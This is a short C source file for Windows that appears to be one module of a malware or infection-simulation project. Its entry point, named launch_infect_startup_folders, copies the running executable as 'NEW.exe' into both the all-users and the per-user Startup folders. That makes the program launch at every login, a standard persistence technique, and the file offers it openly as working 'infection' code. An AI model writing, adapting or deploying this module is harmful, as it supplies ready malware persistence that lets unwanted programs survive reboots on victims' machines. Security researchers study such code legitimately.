#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#include "core.h"
#include "../include/startup_folders.h"



static int CopySelf2Dir(char* path){
    /* Move/copy/write ?? */
    #ifdef DEBUG
    printf("Copying to '%s'\n",path);
    #endif

    /* Get self path */
    char self[MAX_PATH];
    if (GetModuleFileNameA(NULL, self, MAX_PATH) == 0){
        #ifdef DEBUG
        puts("Error while getting exe path");
        #endif
        return -1;
    }

    #ifdef DEBUG
    puts(self);
    #endif

    char newFile[MAX_PATH];
    sprintf(newFile, "%s\\%s", path,"NEW.exe");
    if (CopyFileA(self,newFile,TRUE) == 0) {
        #ifdef DEBUG
        puts("Filed copy");
        #endif
        return -1;
    }

    return 0;
}


/**
 * Copy current executable into startup folders
 * @return 0 in case of success (at least  one copy),
 *         -1 otherwise
 */
static int Copy2Startup(){
    
    char path[MAX_PATH];
    int c1 = -1; int c2 = -1;
    
    /* Try to copy the prg in both CSIDL_COMMON_STARTUP and CSIDL_STARTUP */

    if (SHGetFolderPathA(NULL, CSIDL_COMMON_STARTUP, NULL, 0, path) == S_OK){
        c1 = CopySelf2Dir(path);
    } 
    
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path) == S_OK){
        c2 = CopySelf2Dir(path);
    } 

    return (c1 == 0 || c2 == 0)? 0 : -1;
}



/* Entrypoint */
int launch_infect_startup_folders(struct ModStat** mds){
    *mds = NULL;
    puts("Trigger infection");
    Copy2Startup();
    return 0;
}
